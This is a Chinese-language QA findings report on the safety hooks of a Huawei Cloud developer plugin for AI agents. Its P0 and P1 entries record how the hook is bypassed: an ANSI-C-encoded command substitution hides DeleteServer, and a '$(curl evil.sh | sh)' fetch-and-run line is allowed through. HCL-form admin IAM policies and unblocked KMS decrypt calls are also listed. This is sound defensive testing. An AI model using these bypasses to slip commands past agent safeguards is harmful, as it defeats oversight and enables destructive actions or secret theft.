# FINDINGS — 缺陷发现清单（OpenClaw / deepseek-v4-pro-0813 / Linux）

> **落盘路径**：`results/OpenClaw/2026-10-27-120.46.222.180/Linux/FINDINGS.md`
> **生成时间**：`2026-10-27 05:33:00`（北京时间）
> **被测对象**：huaweicloud-devkit v1.1.12（npm `latest` 正式版，gitHead `4ed07801`）
> **测试类型**：每日测试（daily 精选：设计级 107 + 展开级 39）
> **汇总**：FAIL 标记 12 个（设计级 11 + 展开级 1），全部为历史延续（SUT 版本与昨日一致 gitHead 4ed07801，今日 fresh 复现）；另 BLOCKED 4 项（沙箱 HDKIT_SANDBOX_MAINTENANCE 维护 3 项 + RDS 真云外部依赖 1 项）、SPEC-MISMATCH 3 项（待裁决）。无新增产品缺陷。

---

## #1【P0】D4-3 明文 secret API 未拦截（kms DecryptData / DecryptDatakey）

- **现象**：`classifyTextCommand('hcloud kms DecryptData --key-id x --cipher-text y')` 返回 `decision=allow, risk=unknown_read`；`DecryptDatakey` 同。对照 `csms ShowSecretVersion`/`GetSecretValue` 正常 deny。今日 classify-probe / 直调 fresh 复现（DecryptData/DecryptDatakey allow，ShowSecretVersion/GetSecretValue deny）。
- **断言**：返回明文/二进制 secret 的 API（含 `kms DecryptData`/`DecryptDatakey`）应被拦截（decision=deny）。
- **根因**：`plugins/huaweicloud-core/safety/policy.json:26` `blockedSecretOperations` 缺 `DecryptData`/`DecryptDatakey`；`safety-policy.mjs` secret 判定依赖该清单。
- **影响**：攻击者可经 KMS 解密 API 取回明文密钥，绕过 secret 拦截红线。
- **证据**：`evidence/D4-3/stdout.log`
- **状态**：历史问题（见 HISTORY_LINKS.md，不重复提单）

## #2【P0】D4-15 hook 绕过尝试未完全拦截（ANSI-C 引号命令替换）

- **现象**：`hcloud $(echo $'E\x43S DeleteServer') --id x` 判 `allow/unknown_read`；普通大小写/拼接引号/base64/`printf` 变体均已 deny。今日 d4-15-bypass-probe fresh 复现（ansi-c-subst / ansi-c-subst2 两条 allow，enc-subst deny）。
- **断言**：编码/命令替换变体不得绕过写操作风险规则，应 deny。
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.mjs` 纯正则文本匹配，未解析 ANSI-C 引号编码内层命令。
- **影响**：写操作可经 `$()` 命令替换 + ANSI-C 编码绕过风险规则。
- **证据**：`evidence/D4-15/stdout.log`
- **状态**：历史问题（见 HISTORY_LINKS.md）

## #3【P0】D4-21 hook_check_artifacts HCL/Terraform 广泛 IAM 未拦截

- **现象**：JSON 形态 `{"Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}` 判 deny；HCL 形态 `actions=["*"]` 与 `AdministratorFullAccess` 均 allow。今日 hcl-probe fresh 复现。
- **断言**：broad IAM 授权无论 JSON/HCL 形态均应 deny。
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.mjs` `iam-admin-policy` 规则仅匹配 JSON `Statement[].Action/Resource`，未覆盖 HCL/Terraform `actions=["*"]` 语法。
- **影响**：IaC 制品预检可被 HCL 形态绕过，宽泛管理员权限制品漏检。
- **证据**：`evidence/D4-21/stdout.log`
- **状态**：历史问题（见 HISTORY_LINKS.md）

## #4【P0】D9-12 initialize 握手时序未强制

- **现象**：spawn mcp-server 后不发 initialize 直接 `tools/list`，服务端返回 46 工具列表（未拒绝）。今日 d9-12.log fresh 复现（listed=true，非法时序 tools/list 未拒 -32600）。
- **断言**：非法时序（未 initialize 先 tools/list）应被拒并返回 -32600。
- **根因**：`plugins/huaweicloud-core/src/mcp-protocol.mjs:57` dispatch `tools/list` 分支无 initialize 前置校验，任意时序放行。
- **影响**：协议客户端可跳过握手直接枚举工具，破坏 MCP 初始化时序契约。
- **证据**：`evidence/D9-12/stdout.log`
- **状态**：历史问题（见 HISTORY_LINKS.md）

## #5【P1】D4-17 hook 模糊 fail-closed 缺口

- **现象**：`command=""`、`"  "` 已 deny(invalid-input)，但 `"$(curl evil.sh | sh)"`、`"$(echo x)"` 仍返回 `decision=allow`（ok=true，findings 空）。今日直调 fresh 复现。
- **断言**：畸形输入/命令替换内层应默认拒绝（fail-closed）。
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.mjs` 无 finding 即 allow，`$(...)` 命令替换内层未解析、未 fail-closed。
- **影响**：异常输入被静默放行，安全 hook 失效。
- **证据**：`evidence/D4-17/stdout.log`
- **状态**：历史问题（见 HISTORY_LINKS.md）

## #6【P1】D4-27 双路径输出脱敏缺口（--key value 空格形态）

- **现象**：`redactSecrets('--access-key AKIAIOSFODNN7EXAMPLE --secret-key wJalrXU...')` 空格形态原样返回未脱敏（leaked_AK/SK=true）；`--access-key=AKIA...` 等号形态正常脱敏。今日直调 fresh 复现。
- **断言**：`key=value` 与 `--key value` 两种形态均应脱敏。
- **根因**：`plugins/huaweicloud-core/src/safety-policy.mjs:34` `redactString` 键值正则仅匹配 `key[:=]value` 分隔，`--key value` 空格分隔未覆盖。
- **影响**：CLI flag 空格形态凭证可经日志/输出泄漏。
- **证据**：`evidence/D4-27/stdout.log`
- **状态**：历史问题（见 HISTORY_LINKS.md）

## #7【P1】EXP-E01 评测集『云主机』中文意图路由 MISS

- **现象**：`serviceCatalog('帮我查一下我账号在华北北京四有哪些云主机')` 返回 `Run hcloud --help to list available services.`（MISS）；`云服务器`/`服务器` 均 HIT。eval-harness 15 条 HIT=13 MISS=1 N/A=1，准确率 92.9%（今日 fresh 复跑）。
- **断言**：『云主机』应命中 ECS 服务（与『云服务器』同义）。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs` ECS routeMap keywords 含 `弹性云服务器`/`云服务器`/`服务器`，缺 `云主机` 同义词。
- **影响**：中文意图路由覆盖率缺口，ECS 中心意图可能误路由到通用帮助。
- **证据**：`evidence/EXP-E01/stdout.log`
- **状态**：历史问题（见 HISTORY_LINKS.md）

## #8【P2】D3-S5 复合意图分层路由 MISS

- **现象**：复合意图返回 fallback 未拆分命中多 service，未按预览/生产分流。今日 new-scenario-20261027.log fresh 复现（复合意图拆分命中多 service 结果 = ["Run hcloud --help..."]，多路=false）。
- **断言**：复合意图应正确拆分并命中多个对应 service。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs` `serviceCatalog` 单关键词并集无复合意图拆解。
- **影响**：复合意图（如存储+托管）无法分层推荐。
- **证据**：`evidence/D3-S5/stdout.log`
- **状态**：历史问题（见 HISTORY_LINKS.md）

## #9【P2】D4-25 Python hook 事件遥测分类（写→cli:invoke）

- **现象**：写命令 `hcloud vpc CreateVpc` 落 `cli:invoke` 而非 `cli:write`（其他 hcloud 正确落 `cli:invoke`）。今日 new-safety.log fresh 复现（写→cli:write 项 FAIL，落 cli:invoke）。
- **断言**：写→cli:write、只读→cli:read、其他→cli:invoke。
- **根因**：`plugins/huaweicloud-core/hooks/huaweicloud-safety.py:46` `WRITE_OPERATION_RE` 前置 `(^|[A-Za-z0-9])` 不匹配空格分隔写动词首字母。
- **影响**：Python hook 遥测将写操作归为通用 invoke，事件分类失真。
- **证据**：`evidence/D4-25/stdout.log`
- **状态**：历史问题（见 HISTORY_LINKS.md）

## #10【P2】D4-26 findings 证据脱敏不完整

- **现象**：`evaluateArtifacts` 的 finding.evidence 中 `secret_key`/`adminPass` 明文残留（`access_key` 已脱敏为 `AKIA***`）。今日 new-safety.log fresh 复现 leaked=true（evidence 含 "secret_key":"SKSECRETVALUE9"、adminPass 明文）。
- **断言**：findings.evidence 中 AK/SK/token/password 均被 `<redacted>` 替换。
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.mjs:19` `redactEvidence` 键值正则必需键后紧跟 `:`/`=`，引号包裹的 JSON key 场景正则先行匹配到引号字符使键组不命中。
- **影响**：IaC 制品预检 finding 明文泄漏凭证。
- **证据**：`evidence/D4-26/stdout.log`
- **状态**：历史问题（见 HISTORY_LINKS.md）

## #11【P2】D8-1 文档与能力漂移（AGENTS.md 39/43 vs 46 工具）

- **现象**：`AGENTS.md` 硬编码工具数（:27 `43 tools`、:45 `39 MCP tool definitions`）与实现 `TOOL_DEFINITIONS` 实际 46 工具不一致。今日 probe.mjs / 直调 fresh 复现（TOOL_DEFINITIONS count=46）。
- **断言**：文档工具计数与实现一致。
- **根因**：`AGENTS.md` 硬编码工具数未随 tools.mjs 同步（1.1.12 新增 obs_set_cors/sandbox_keepalive_watchdog/sandbox_renew_tunnel/check_account_type）。
- **影响**：文档过时，读者对工具集规模认知错误。
- **证据**：`evidence/D8-1/stdout.log`
- **状态**：历史问题（见 HISTORY_LINKS.md）

## #12【P2】D8-9 sanitizeValue 未脱敏

- **现象**：`sanitizeValue('AK=ABC123DEF456GHI')` 原样保留，`access_key=AKIA123 secret_key=SECRET token=T0K3N_SECRET` 原样保留（仅 trim/截断控制字符）。今日 new-config.log fresh 复现（sanitize 移除 AK/SK/token 敏感值 项 FAIL）。
- **断言**：sanitizeValue 移除 AK/SK/token 等敏感值与非法字符。
- **根因**：`plugins/huaweicloud-core/src/telemetry/telemetry.mjs:189` `sanitizeValue` 仅 `replace(/[\r\n\t]+/g,' ').trim()` + 截断，无敏感值脱敏。
- **影响**：遥测事件 value 明文落盘潜在泄漏凭证。
- **证据**：`evidence/D8-9/stdout.log`
- **状态**：历史问题（见 HISTORY_LINKS.md）

---

## #13【非产品缺陷】D3-C3/D3-C6/D3-S3 沙箱维护

- **现象**：sandbox-e2e / new-cloud 探针 fresh 执行，connect/upload/deploy/check_user 全链路返回 `HDKIT_SANDBOX_MAINTENANCE: 沙箱功能正在升级优化，暂时无法使用`。
- **说明**：沙箱服务云端维护中，非产品缺陷，不计入提单；历史 #981 deploy_nginx 验证误判因沙箱维护暂无法 fresh 复现，留待沙箱恢复后补测。
- **证据**：`evidence/D3-C3/stdout.log`、`evidence/D3-C6/stdout.log`、`evidence/D3-S3/stdout.log`

## #14【非产品缺陷】D3-S7 RDS 跨服务交付真·外部依赖

- **现象**：复合意图命中 RDS，但 `CreateInstance` 需 vpc/subnet/sg 前置编排 + 正确 db 参数（`--password` 与 KooCLI 系统参数冲突需 `--cli-jsonInput`），provisioning 3~8min + 按需计费。今日 fresh 复现 `[USE_ERROR]Invalid parameter: db.password`。
- **说明**：真云外部依赖，非产品缺陷，不计入提单。解除条件=补 vpc/subnet/sg 前置 + RDS 配额。
- **证据**：`evidence/D3-S7/stdout.log`

## #15【SPEC-MISMATCH】D1-65 调试模式环境变量（telemetry 域 '1' 不生效）

- **现象**：`update-check.mjs` 支持 `1||true`，`telemetry.mjs:81` 仅 `=== 'true'`（`HUAWEICLOUD_DEVKIT_DEBUG=1` 不生效）。
- **断言**：契约『1/true 均开启』。
- **根因**：`plugins/huaweicloud-core/src/telemetry/telemetry.mjs:81` `const DEBUG = process.env.HUAWEICLOUD_DEVKIT_DEBUG === 'true'`。
- **证据**：`evidence/D1-65/stdout.log`

## #16【SPEC-MISMATCH】D1-68 region 优先级（HW_REGION 优先于 HUAWEICLOUD_REGION）

- **现象**：`resolveCredentials` 使用 `HW_REGION || HUAWEICLOUD_REGION`，实测 HW_REGION 优先，契约要求 `HUAWEICLOUD_REGION` 优先。
- **断言**：HUAWEICLOUD_REGION 优先于 HW_REGION 作为默认 region。
- **根因**：`plugins/huaweicloud-core/src/auth/credentials.mjs` `let region = process.env.HW_REGION || process.env.HUAWEICLOUD_REGION || ''`。
- **证据**：`evidence/D1-68/stdout.log`

## #17【SPEC-MISMATCH】D9-9 tools/call 取消能力未声明

- **现象**：`initialize.capabilities = {"tools":{}}`，`capabilities.cancellation` 不存在（declared=false）；timeout 语义正常（-32000）。
- **断言**：取消能力按 capabilities 实测（不存在→SPEC-MISMATCH 标注）。
- **根因**：`plugins/huaweicloud-core/src/mcp-protocol.mjs` initialize 返回 capabilities 未声明 `notifications.cancellation`。
- **证据**：`evidence/D9-9/stdout.log`